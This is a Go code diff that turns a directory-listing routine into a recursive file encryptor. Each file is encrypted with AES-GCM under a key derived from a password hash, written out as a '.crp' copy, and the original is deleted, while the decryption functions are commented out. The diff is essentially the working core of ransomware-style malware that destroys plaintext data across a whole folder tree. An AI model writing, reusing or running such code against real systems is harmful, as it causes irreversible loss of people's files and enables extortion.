@@ -43,11 +43,24 @@ func main() {
 	hasher.Write([]byte(pass))
 	hash := hex.EncodeToString(hasher.Sum(nil))
 
+	hashSaveFile, err := os.OpenFile("save_hash", os.O_WRONLY|os.O_CREATE, 0600)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "os.OpenFile\n")
+		os.Exit(1)
+	}
+	defer hashSaveFile.Close()
+
+	fmt.Fprintf(os.Stdout, "Save IT >> %v\n", hashSaveFile.Name())
+	hashSaveFile.WriteString(hash)
+
 	fmt.Fprintln(os.Stdout, "-----------------------------------------------------------")
+
+	cryptoDir(dir, hash)
+
 	os.Exit(0)
 }
 
-func readdir(dir string) {
+func cryptoDir(dir string, hash string) {
 	// открываем директорию
 	dh, err := os.Open(dir)
 	if err != nil {
@@ -64,18 +77,27 @@ func readdir(dir string) {
 		}
 		// проход
 		for _, fi := range fis {
-			// имя файла
-			fmt.Println(fi.Name())
 			// рекурсивный проход по поддиректориям
 			if fi.IsDir() {
-				readdir(dir + "/" + fi.Name())
+				cryptoDir(dir+"/"+fi.Name(), hash)
+			} else {
+				// имя файла
+				fmt.Fprintf(os.Stdout, "encrypt %v\n", fi.Name())
+				file, err := ioutil.ReadFile(dir + "/" + fi.Name())
+				if err != nil {
+					fmt.Fprintf(os.Stderr, "ioutil.ReadFile: %v\n", err)
+					os.Exit(1)
+				}
+
+				encryptFile(dir+"/"+fi.Name()+".crp", file, hash)
+				os.Remove(dir + "/" + fi.Name())
 			}
 		}
 	}
 }
 
-func encrypt(data []byte, passphrase string) []byte {
-	block, _ := aes.NewCipher([]byte(createHash(passphrase)))
+func encrypt(data []byte, hash string) []byte {
+	block, _ := aes.NewCipher([]byte(hash))
 	gcm, err := cipher.NewGCM(block)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "EncryptFunc NewGCM: %v\n", err)
@@ -90,6 +112,17 @@ func encrypt(data []byte, passphrase string) []byte {
 	return ciphertext
 }
 
+func encryptFile(filename string, data []byte, hash string) {
+	f, err := os.Create(filename)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "encryptFileFunc Create: %v\n", err)
+		os.Exit(1)
+	}
+	defer f.Close()
+	f.Write(encrypt(data, hash))
+}
+
+/*
 func decrypt(data []byte, passphrase string) []byte {
 	key := []byte(createHash(passphrase))
 	block, err := aes.NewCipher(key)
@@ -112,16 +145,6 @@ func decrypt(data []byte, passphrase string) []byte {
 	return plaintext
 }
 
-func encryptFile(filename string, data []byte, passphrase string) {
-	f, err := os.Create(filename)
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "encryptFileFunc Create: %v\n", err)
-		os.Exit(1)
-	}
-	defer f.Close()
-	f.Write(encrypt(data, passphrase))
-}
-
 func decryptFile(filename string, passphrase string) []byte {
 	data, err := ioutil.ReadFile(filename)
 	if err != nil {
@@ -130,6 +153,7 @@ func decryptFile(filename string, passphrase string) []byte {
 	}
 	return decrypt(data, passphrase)
 }
+*/
 
 func isDir(name string) bool {
 	var stat bool
